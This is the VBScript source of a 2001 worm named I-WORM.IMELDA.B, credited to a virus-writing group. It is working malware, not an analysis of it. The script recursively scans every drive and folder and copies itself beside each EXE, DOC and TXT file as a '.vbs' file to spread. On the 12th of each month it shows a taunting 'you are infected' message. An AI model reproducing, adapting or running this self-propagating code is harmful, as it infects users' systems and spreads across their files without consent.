'I-WORM.IMELDA.B
'(C)2001, by Iwing
'Virusindo - Indonesian Virus Network
'http://indovirus.8m.com , IRC Dalnet #indovirus
'===============================================
Set FSO = CreateObject("scripting.filesystemobject")
Call CariDrive
if day(now) = 12 then
sh = msgbox("Hi there.., you are infected by some of" & Chr(13) & _
"IWING creations.., have a nice day", 10 ,"I-WORM.IMELDA.B ")
end if
Function CariDrive()
On Error Resume Next
Set DriveNya = FSO.Drives
For Each DriveKu In DriveNya
MyPath = DriveKu & "\"
Call CariFile(MyPath)
Next
End Function
Function CariFile(TempatNya)
FileNya = TempatNya
Set FolderNya = FSO.GetFolder(FileNya)
Set FileDiFolder = FolderNya.Files
For Each Traget In FileDiFolder
If FSO.GetExtensionName(Traget.Path) = "EXE" Then
FSO.CopyFile wscript.scriptfullname, Traget.Path & ".vbs", True
End If
If FSO.GetExtensionName(Traget.Path) = "DOC" Then
FSO.CopyFile wscript.scriptfullname, Traget.Path & ".vbs", True
End If
If FSO.GetExtensionName(Traget.Path) = "TXT" Then
FSO.CopyFile wscript.scriptfullname, Traget.Path & ".vbs", True
End If
Next
Set SubNya = FolderNya.Subfolders
For Each Subku In SubNya
Call CariFile(Subku.Path)
Next
End Function
